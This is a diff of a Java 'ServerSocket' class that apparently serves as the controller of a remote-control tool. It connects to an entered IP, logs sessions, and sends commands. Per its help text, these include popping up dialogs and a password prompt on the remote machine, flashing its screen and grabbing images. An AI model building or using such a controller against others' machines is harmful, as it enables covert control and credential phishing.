@@ -34,43 +34,45 @@ public class ServerSocket {
 		new ServerSocket();
 	}
 	public ServerSocket() {
-		in = new Scanner(System.in);
-		System.out.print("Input IP：");
-		IP = in.nextLine().trim();
-		try {
-			socket = new Socket(IP, PORT);
-			Date date = new Date();
-			SimpleDateFormat sdf = new SimpleDateFormat("MM月dd日HH时mm分_" + IP);
-			fileName = sdf.format(date);
-			file = new File(path + fileName);
-			if(!file.exists()){
-				file.mkdirs();
+		while(true){
+				try {
+					in = new Scanner(System.in);
+					System.out.print("Input IP：");
+					IP = in.nextLine().trim();
+					socket = new Socket(IP, PORT);
+					Date date = new Date();
+					SimpleDateFormat sdf = new SimpleDateFormat("MM月dd日HH时mm分_" + IP);
+					fileName = sdf.format(date);
+					file = new File(path + fileName);
+					if(!file.exists()){
+						file.mkdirs();
+					}
+					file = new File(path + fileName + "\\log.txt");
+					try {
+						bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file)));
+					} catch (FileNotFoundException e) {
+						e.printStackTrace();
+					}
+					try {
+						bw.write("開始紀錄");
+						bw.newLine();
+						bw.flush();
+					} catch (IOException e) {
+						e.printStackTrace();
+					}
+					System.out.println("contected");
+					dos = new DataOutputStream(socket.getOutputStream());
+					dis = new DataInputStream(socket.getInputStream());
+					new Thread(new MyInputThread()).start();
+					doSomething();
+				} catch (UnknownHostException e) {
+					e.printStackTrace();
+				} catch (IOException e) {
+					e.printStackTrace();
+				}
 			}
-			file = new File(path + fileName + "\\log.txt");
-			try {
-				bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file)));
-			} catch (FileNotFoundException e) {
-				e.printStackTrace();
-			}
-			try {
-				bw.write("開始紀錄");
-				bw.newLine();
-				bw.flush();
-			} catch (IOException e) {
-				e.printStackTrace();
-			}
-			System.out.println("contected");
-			dos = new DataOutputStream(socket.getOutputStream());
-			dis = new DataInputStream(socket.getInputStream());
-			new Thread(new MyInputThread()).start();
-			doSomething();
-		} catch (UnknownHostException e) {
-			e.printStackTrace();
-		} catch (IOException e) {
-			e.printStackTrace();
-		}
+			
 	}
-
 	class MyInputThread implements Runnable {
 		public void run() {
 			while (true) {
@@ -108,6 +110,7 @@ public class ServerSocket {
 		} catch (IOException e) {
 			e.printStackTrace();
 		}
+		System.out.println(IP+" reply:\n"+msg.replaceFirst("null", ""));
 		
 
 	}
@@ -116,8 +119,8 @@ public class ServerSocket {
 		while(true){
 			System.out.println("input command:");
 			dosS = in.nextLine().trim();
-			if (dosS.equals("exit")) {
-			} else if (dosS.equals("")) {
+			if (dosS==null||dosS.equals("")) {
+			} else if (dosS.equals("exit")) {
 			} else if (dosS.endsWith("-help")) {
 				System.out.println("-doutmsg msg 以对话框形式输出信息\n" + "-dinmsg msg弹出一个输入对话框+显示信息msg\n"
 						+ "-dinpass msg 弹出一个输入密码对话框+显示信息msg\n" + "-flash msg 闪屏并显示msg所表示的文字\n" + "-p:获取图片\n"
